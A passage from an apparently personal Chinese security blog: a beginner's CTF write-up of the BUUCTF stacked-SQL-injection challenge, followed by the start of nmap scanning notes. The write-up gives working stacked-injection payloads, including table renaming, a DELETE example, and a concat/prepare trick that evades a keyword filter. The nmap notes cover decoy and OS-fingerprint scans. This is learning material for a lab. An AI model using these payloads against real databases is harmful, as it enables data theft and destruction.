<td align="left">介于 -922,337,203,685,477.5808 与 922,337,203,685,477.5807 之间的货币数据。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">float(n)</td>
<td align="left">从 -1.79E + 308 到 1.79E + 308 的浮动精度数字数据。n 参数指示该字段保存 4 字节还是 8 字节。float(24) 保存 4 字节，而 float(53) 保存 8 字节。n 的默认值是 53。</td>
<td align="left">4 或 8 字节</td>
</tr>
<tr>
<td align="left">real</td>
<td align="left">从 -3.40E + 38 到 3.40E + 38 的浮动精度数字数据。</td>
<td align="left">4 字节</td>
</tr>
</tbody></table>
<p><strong>Date 类型：</strong></p>
<table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
<th align="left">存储</th>
</tr>
</thead>
<tbody><tr>
<td align="left">datetime</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 3.33 毫秒。</td>
<td align="left">8 字节</td>
</tr>
<tr>
<td align="left">datetime2</td>
<td align="left">从 1753 年 1 月 1 日 到 9999 年 12 月 31 日，精度为 100 纳秒。</td>
<td align="left">6-8 字节</td>
</tr>
<tr>
<td align="left">smalldatetime</td>
<td align="left">从 1900 年 1 月 1 日 到 2079 年 6 月 6 日，精度为 1 分钟。</td>
<td align="left">4 字节</td>
</tr>
<tr>
<td align="left">date</td>
<td align="left">仅存储日期。从 0001 年 1 月 1 日 到 9999 年 12 月 31 日。</td>
<td align="left">3 bytes</td>
</tr>
<tr>
<td align="left">time</td>
<td align="left">仅存储时间。精度为 100 纳秒。</td>
<td align="left">3-5 字节</td>
</tr>
<tr>
<td align="left">datetimeoffset</td>
<td align="left">与 datetime2 相同，外加时区偏移。</td>
<td align="left">8-10 字节</td>
</tr>
<tr>
<td align="left">timestamp</td>
<td align="left">存储唯一的数字，每当创建或修改某行时，该数字会更新。timestamp 值基于内部时钟，不对应真实时间。每个表只能有一个 timestamp 变量。</td>
<td align="left"></td>
</tr>
</tbody></table>
<h4 id="其他数据类型："><a href="#其他数据类型：" class="headerlink" title="其他数据类型："></a><strong>其他数据类型：</strong></h4><table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sql_variant</td>
<td align="left">存储最多 8,000 字节不同数据类型的数据，除了 text、ntext 以及 timestamp。</td>
</tr>
<tr>
<td align="left">uniqueidentifier</td>
<td align="left">存储全局唯一标识符 (GUID)。</td>
</tr>
<tr>
<td align="left">xml</td>
<td align="left">存储 XML 格式化数据。最多 2GB。</td>
</tr>
<tr>
<td align="left">cursor</td>
<td align="left">存储对用于数据库操作的指针的引用。</td>
</tr>
<tr>
<td align="left">table</td>
<td align="left">存储结果集，供稍后处理。</td>
</tr>
</tbody></table>
<p>接下来还有一手SQL函数，明儿再看，先整堆叠注入。。。。（SQL没基础，所以先学学）</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>Stacked injection–堆叠注入–堆查询注入</p>
<p>原文地址;<a href="http://www.sqlinjection.net/stacked-queries/" target="_blank" rel="noopener">http://www.sqlinjection.net/stacked-queries/</a>   本篇属于集合原作者的思路和个人想法结合的一篇产物。Stacked injection 汉语翻译过来后，国内有的称为堆查询注入，也有称之为堆叠注入。个人认为称之为堆叠注入更为准确。堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。</p>
<h2 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>（咦，那感觉，挺简单的？）</p>
<h2 id="0x02-堆叠注入的局限性"><a href="#0x02-堆叠注入的局限性" class="headerlink" title="0x02 堆叠注入的局限性"></a>0x02 堆叠注入的局限性</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.jpg" alt="img"></p>
<p>Ps：此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。</p>
<p>在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>那么回到原题，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">然后随便试了试发现过滤</span><br><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure>

<p><a href="http://web16.buuoj.cn/?inject=1where" target="_blank" rel="noopener">http://web16.buuoj.cn/?inject=1where</a><br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​</span><br></pre></td></tr></table></figure></p>
<p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后师傅们很牛逼的就知道他是堆叠注入了（学）</span><br></pre></td></tr></table></figure></p>
<p>师傅们之所以知道是堆叠注入，应该是发现show函数没被过滤并且union被过滤了叭，所以莫得联合注入，就去堆叠注入了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#			//表示这一句没啥作用，因为这一题flag就在默认库里头</span></span><br><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">/?inject=222';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>这些也都是简单地show语句查询，去了解一下show语句（为啥flag不能直接show）</p>
<h3 id="MySQL中show语法"><a href="#MySQL中show语法" class="headerlink" title="MySQL中show语法"></a>MySQL中show语法</h3><ol>
<li>show tables或show tables from database_name; – 显示当前数据库中所有表的名称。 </li>
<li>show databases; – 显示mysql中所有数据库的名称。 </li>
<li>show columns from table_name from database_name; 或show columns from database_name.table_name; – 显示表中列名称。 </li>
<li>show grants for user_name; – 显示一个用户的权限，显示结果类似于grant 命令。 </li>
<li>show index from table_name; – 显示表的索引。 </li>
<li>show status; – 显示一些系统特定资源的信息，例如，正在运行的线程数量。 </li>
<li>show variables; – 显示系统变量的名称和值。 </li>
<li>show processlist; – 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。 </li>
<li>show table status; – 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的最新更新时间。 </li>
<li>show privileges; – 显示服务器所支持的不同权限。 </li>
<li>show create database database_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
<li>show create table table_name; – 显示create database 语句是否能够创建指定的数据库。 </li>
<li>show engines; – 显示安装以后可用的存储引擎和默认引擎。 </li>
<li>show innodb status; – 显示innoDB存储引擎的状态。 </li>
<li>show logs; – 显示BDB存储引擎的日志。 </li>
<li>show warnings; – 显示最后一个执行的语句所产生的错误、警告和通知。 </li>
<li>show errors; – 只显示最后一个执行语句所产生的错误。 </li>
<li>show [storage] engines; –显示安装后的可用存储引擎和默认引擎。</li>
</ol>
<p>除了status,processlist和grants外，其它的都可以带有like wild选项，它可以使用SQL的’%’和’_’字符；</p>
<p>show databases like ‘%t’;</p>
<p>将会列出所有数据库名字末尾为’t’字符的数据库</p>
<p>当然了，在这些sql中，你也可以用db_name.table_name来代替 table_name from db_name这样写会更简便些!</p>
<p>如果一个用户没有一个表的任何权限，表将不在SHOW TABLES或mysqlshow db_name中的输出中显示</p>
<p>大家可能还记得describe table_name ，它实现的是与show columns from db_name.table_name一样的效果</p>
<p>show status将可以用mysqlshow –status 来得到同样的效果</p>
<ul>
<li>列 含义</li>
<li>name 表名</li>
<li>Type 表的类型 (ISAM，MyISAM或HEAP)</li>
<li>Row_format 行存储格式 (固定, 动态, 或压缩）</li>
<li>Rows 行数量</li>
<li>Avg_row_length 平均行长度</li>
<li>Data_length 数据文件的长度</li>
<li>Max_data_length 数据文件的最大长度</li>
<li>Index_length 索引文件的长度</li>
<li>Data_free 已分配但未使用了字节数</li>
<li>Auto_increment 下一个 autoincrement(自动加1）值</li>
<li>Create_time 表被创造的时间</li>
<li>Update_time 数据文件最后更新的时间</li>
<li>Check_time 最后对表运行一个检查的时间</li>
<li>Create_options 与CREATE TABLE一起使用的额外选项</li>
<li>Comment 当创造表时，使用的注释 (或为什么MySQL不能存取表信息的一些信息)。</li>
</ul>
<p>SHOW FIELDS是SHOW COLUMNS一个同义词，SHOW KEYS是SHOW INDEX一个同义词。你也可以用mysqlshow db_name tbl_name或mysqlshow -k db_name tbl_name 列出一张表的列或索引。</p>
<p>SHOW INDEX以非常相似于ODBC的SQLStatistics调用的格式返回索引信息。下面的列被返回：</p>
<p>列 含义</p>
<p>Table   表名</p>
<p>Non_unique  0，如果索引不能包含重复。</p>
<p>Key_name    索引名</p>
<p>Seq_in_index    索引中的列顺序号, 从 1 开始。</p>
<p>Column_name 列名。</p>
<p>Collation   列怎样在索引中被排序。在MySQL中，这可以有值A（升序) 或NULL（不排序)。</p>
<p>Cardinality 索引中唯一值的数量。这可通过运行isamchk -a更改.</p>
<p>Sub_part    如果列只是部分被索引，索引字符的数量。NULL，如果整个键被索引。</p>
<p>嗯，熟悉的语句不多，show似乎也确实看不了字段内容。（怪不得师傅们都用了别的方法）</p>
<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4><ol>
<li>改数据库：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>（由于是只回显前面的，所以最后一个语句似乎不用写，然后id=1意味着原来的flag=1，所以无回显，需要注入1’ or ‘1’ =’1）</p>
<p>改数据库的语句：改表名大概就如师傅这么写吧，rename table ‘表名’ to ‘新表名‘；</p>
<p>看看改列名，</p>
<p>各个数据库不一样。<br>oracle: ALTER TABLE 表名 RENAME COLUMN 列名 TO 新列名</p>
<p>sqlserver:exec sp_rename ‘[表名].[列名]’,’[表名].[新列名]’</p>
<p><strong>mysql:ALTER TABLE 表名 CHANGE ’列名‘ ’新列名‘ 列类型</strong></p>
<p>DEFAULT CHARACTER SET utf8：数据库字符集。设置数据库的默认编码为utf8，utf8中间不要”-“；</p>
<p>COLLATE utf8_general_ci:数据库校对规则。ci是case insensitive的缩写，意思是大小写不敏感；相对的是cs，即case sensitive，大小写敏感；还有一种是utf8_bin，是将字符串中的每一个字符用二进制数据存储，区分大小写。</p>
<p>NOT NULL 非空呗</p>
<p>改列名加上就对了23333  </p>
<p>ALTER TABLE 表名 CHANGE ’列名‘  ’新列名‘  列类型 CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</p>
<h3 id="mysql预编译"><a href="#mysql预编译" class="headerlink" title="mysql预编译"></a>mysql预编译</h3><ol start="2">
<li>预编译（mysql）</li>
</ol>
<p>SQL代码</p>
<ol>
<li>prepare presql from ‘select a from table’;  </li>
</ol>
<p>上面这句SQL创建了一个<strong>预编译</strong>的SQL。名为presql，这个<strong>预编译</strong>SQL的存活期就是当前的会话，也就是当前的数据库连接。<br>如果连接一断开 ，那就会消失。</p>
<p>from后面跟的就是要进行编译的那个SQL，这个值可以是一个字面的字符串值 ，就像上面；也可以是一个变量。<br>比如：</p>
<p>SQL代码</p>
<p>set @sql = ‘select * from admin’;</p>
<p>prepare presql from @sql; </p>
<p>from后面跟的只能是字面值或者变量这两种情况 ，不能直接跟十六进制的字符串。</p>
<p>比如：</p>
<p>SQL代码</p>
<ol>
<li>prepare testhex from 0x73656C656374202A2066726F6D2061;  </li>
</ol>
<p>这样是错误 的，可以先用变量来接收这个十六进制串的值，然后再进行SQL的编译。</p>
<p>SQL代码</p>
<ol>
<li>set @sql = 0x73656C656374202A2066726F6D2061;prepare testhex from @sql;  </li>
</ol>
<p>注意：被编译的SQL只能是一条单独的语句，不能多条语句一起编译，比如：</p>
<p>SQL代码</p>
<ol>
<li>prepare mutisql from ‘select 1;select 2’;  </li>
</ol>
<p>这是错误的。</p>
<p>可以被<strong>预编译</strong>的SQL语句的类型也是有限制的，并不是所有的SQL都可以被编译。<br>下面这些类型的SQL是可以编译的：<br>create table,delete,do,insert,replace,select,set,update 和多数的show语句。</p>
<p>（这题用了select）</p>
<p>带参数的<strong>预编译</strong>SQL：</p>
<p>SQL代码</p>
<p>1.1 prepare pstmt from ‘select a from table where id = ?’;  </p>
<p>参数用?代替。注意，就算参数的值是一个字符串，也不用加引号。加了反而有错。</p>
<p>在调用的时候利用using关键字向SQL传递参数 。</p>
<p>SQL代码</p>
<p>1.2 set @value = 1;execute pstmt using @value;  </p>
<p>先声明一个变量来保存参数的值，然后通过后面的using @value来传SQL传递参数 。<br>注意这里的参数的值只能由变量来传递，不能直接写成execute pstmt using 1;<br>这是错误的。</p>
<p>多个参数之间用逗号隔开。</p>
<p>删除<strong>预编译</strong>SQL的办法：</p>
<p>SQL代码</p>
<p>deallocate|drop prepare pstmt;   </p>
<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prepare</span> presql <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> presql;				//执行语句<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span>  拿到flag</span><br><span class="line"><span class="keyword">deallocate</span> <span class="keyword">prepare</span> presql;</span><br></pre></td></tr></table></figure>

<p>附：</p>
<p>concat函数</p>
<p>concat(str1,str2,…)返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<p>strstr()函数</p>
<p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符及字符串及剩余部分，否则返回 FALSE。</p>
<p>该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 <a href="https://www.runoob.com/php/func-string-stristr.html" target="_blank" rel="noopener">stristr()</a> 函数。</p>
<p>语法</p>
<p>strstr(<em>string,search,before_search</em>)</p>
<table>
<thead>
<tr>
<th><em>string</em></th>
<th>必需。规定被搜索的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td><em>search</em></td>
<td>必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td>
</tr>
<tr>
<td><em>before_search</em></td>
<td>可选。一个默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td>
</tr>
</tbody></table>
<p>这里检测了</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strstr</span><span class="params">(<span class="variable">$inject</span>, <span class="string">"set"</span>)</span></span> &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>

<p>应该是返回ture了，所以蹦出来，所以大概就要绕过他（出来个这么个函数大概就这意思吧，不然也没别的操作了）</p>
<p>于是利用他的区分大小写加上sql语句的不区分大小写，就能绕过了。</p>
<h3 id="bb两句："><a href="#bb两句：" class="headerlink" title="bb两句："></a>bb两句：</h3><p>wdnmd，一天的任务变成两天完成了，SQL的函数都还没看，还是太菜了（基础太差，哭了）</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>method1：<a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<p>method2：<a href="https://www.codercto.com/a/81951.html" target="_blank" rel="noopener">https://www.codercto.com/a/81951.html</a></p>
<p>sql：<a href="https://www.runoob.com/sql/sql-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/sql/sql-tutorial.html</a></p>
<p>堆叠注入：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
<p>show:<a href="https://www.cnblogs.com/SQL888/p/5750161.html" target="_blank" rel="noopener">https://www.cnblogs.com/SQL888/p/5750161.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/28/WarmUp_随便注/" data-id="ck2g3l2oo001jlgv30ienslmq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-nmap" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/22/nmap/" class="article-date">
  <time datetime="2019-07-22T08:07:55.000Z" itemprop="datePublished">2019-07-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/22/nmap/">nmap</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>后天要参加人生第一次awd线下攻防了，今天赶紧突击一下，先学习一下nmap的一些常规操作</p>
<h3 id="引入："><a href="#引入：" class="headerlink" title="引入："></a>引入：</h3><p><strong>1) 获取远程主机的系统类型及开放端口</strong></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -sS -P0 -sV -O <span class="symbol">&lt;target&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的 &lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网</p>
<p>-sS TCP SYN 扫描 (又称半开放,或隐身扫描)<br>-P0 允许你关闭 ICMP pings.<br>-sV 打开系统版本检测<br>-O 尝试识别远程操作系统</p>
<p>其它选项:</p>
<p>-A 同时打开操作系统指纹和版本检测<br>-v 详细输出扫描情况.</p>
<p><strong>2) 列出开放了指定端口的主机列表</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p <span class="number">80</span> -oG – <span class="number">192.168</span><span class="number">.1</span>.* | grep open</span><br></pre></td></tr></table></figure>

<p><strong>3) 在网络寻找所有在线主机</strong></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span>.*</span><br></pre></td></tr></table></figure>

<p>或者也可用以下命令:</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>指定 subnet</p>
<p><strong>4) Ping 指定范围内的 IP 地址</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span><span class="number">-254</span></span><br></pre></td></tr></table></figure>

<p><strong>5) 在某段子网上查找未占用的 IP</strong></p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.2</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> <span class="selector-tag">&amp;</span><span class="selector-tag">&amp;</span> <span class="selector-tag">egrep</span> “<span class="selector-tag">00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span>″ /<span class="selector-tag">proc</span>/<span class="selector-tag">net</span>/<span class="selector-tag">arp</span></span><br></pre></td></tr></table></figure>

<p><strong>6) 在局域网上扫找 Conficker 蠕虫病毒</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -T4 -p139,<span class="number">445</span> -n -v –script=smb-check-vulns –script-args safe=<span class="number">1</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span><span class="number">-254</span></span><br></pre></td></tr></table></figure>

<p><strong>7) 扫描网络上的恶意接入点 （rogue APs）.</strong></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1<span class="number">-85</span>,<span class="number">113</span>,<span class="number">443</span>,<span class="number">8080</span><span class="number">-8100</span> -T4 –min-hostgroup <span class="number">50</span> –max-rtt-timeout</span><br><span class="line"><span class="number">2000</span> –initial-rtt-timeout <span class="number">300</span> –max-retries <span class="number">3</span> –host-timeout <span class="number">20</span>m</span><br><span class="line">–max-scan-delay <span class="number">1000</span> -oA wapscan <span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p><strong>8 ) 使用诱饵扫描方法来扫描主机端口</strong></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.10</span> <span class="selector-tag">-D</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.2</span></span><br></pre></td></tr></table></figure>

<p><strong>9) 为一个子网列出反向DNS记录</strong></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -R -sL <span class="number">209.85</span>.<span class="number">229.99</span>/<span class="number">27</span> | awk ‘&#123;<span class="keyword">if</span>($3==”<span class="keyword">not</span>”)<span class="keyword">print</span>”(“$2″) <span class="keyword">no</span> PTR”;<span class="keyword">else</span> <span class="keyword">print</span>$3″ is “$2&#125;’ | <span class="keyword">grep</span> ‘(‘</span><br></pre></td></tr></table></figure>

<p><strong>10) 显示网络上共有多少台 Linux 及 Win 设备?</strong></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -F -O <span class="number">192.168</span>.<span class="number">0.1</span>-<span class="number">255</span> | <span class="keyword">grep</span> “Running: ” &gt; <span class="regexp">/tmp/</span>os; echo “$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Linux \</span><br><span class="line">| wc -l) Linux device(s)”; echo “$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Windows | wc -l) Window(s) device”</span><br></pre></td></tr></table></figure>

<p>### </p>
<h3 id="1-用主机名和IP地址扫描系统"><a href="#1-用主机名和IP地址扫描系统" class="headerlink" title="1. 用主机名和IP地址扫描系统"></a>1. 用主机名和IP地址扫描系统</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> server2.tecmint.<span class="keyword">com</span>（<span class="number">192.168</span>.<span class="number">0.101</span>）</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">42</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.415</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="2-扫描使用“-v”选项"><a href="#2-扫描使用“-v”选项" class="headerlink" title="2.扫描使用“-v”选项"></a>2.扫描使用“-v”选项</h3><p>你可以看到下面的命令使用“ <strong>-</strong>v “选项后给出了远程机器更详细的信息。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -v server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">43</span> EST</span><br><span class="line">Initiating ARP Ping Scan against <span class="number">192.168</span>.<span class="number">0.101</span> [<span class="number">1</span> port] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">The ARP Ping Scan took <span class="number">0.01</span>s <span class="keyword">to</span> scan <span class="number">1</span> total hosts.</span><br><span class="line">Initiating SYN Stealth Scan against server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) [<span class="number">1680</span> ports] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">22</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span 